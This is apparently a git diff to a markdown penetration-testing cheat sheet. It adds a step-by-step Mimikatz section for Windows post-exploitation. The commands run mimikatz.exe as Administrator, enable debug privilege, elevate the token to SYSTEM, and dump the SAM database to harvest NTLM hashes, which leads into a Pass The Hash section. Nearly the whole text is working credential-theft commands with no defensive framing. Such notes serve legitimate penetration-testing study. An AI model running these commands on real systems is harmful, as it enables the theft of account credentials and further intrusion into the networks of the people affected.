@@ -2,6 +2,8 @@
 
 ## Mimikatz
 
+### NTLM Hash
+
 Post exploitation commands must be executed from SYSTEM level privileges.
 
 * mimikatz # privilege::debug
@@ -9,6 +11,32 @@ Post exploitation commands must be executed from SYSTEM level privileges.
 * mimikatz # token::elevate
 * mimikatz # lsadump::sam
 * mimikatz # sekurlsa::logonpasswords
+
+Execute Mimikatz as Administrator:
+
+```
+.\mimikatz.exe
+```
+
+Enable the SEDebugPrivilege access right required to tamper with another process:
+
+```
+privilege::debug
+```
+
+LSASS is a SYSTEM process so we need to elevate the security token from High Integrity to SYSTEM Integrity:
+
+```
+token::elevate
+```
+
+Dump the information of the SAM database:
+
+```
+lsadump::sam
+```
+
+We're interested in the NTLM hashes.
 
 ### Pass The Hash
 
